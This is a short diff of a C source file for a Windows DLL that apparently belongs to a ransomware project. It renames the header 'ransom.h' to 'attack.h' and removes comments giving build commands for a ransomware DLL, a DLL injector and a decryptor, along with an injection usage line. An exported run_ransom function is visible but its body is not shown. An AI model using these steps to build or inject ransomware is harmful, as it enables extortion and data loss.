@@ -1,10 +1,5 @@
 #include <windows.h>
-#include "ransom.h"
-
-// gcc -shared -o ransom_dll.dll ransom_dll.c ransom.c -lcrypto -lssl
-// gcc dll_injector.c -o dll_injector.exe
-// gcc decrypt.c -o decrypt.exe -lcrypto -lssl
-// ./dll_injector.exe <path> <pid>
+#include "attack.h"
 
 __declspec(dllexport) void run_ransom(void)
 {
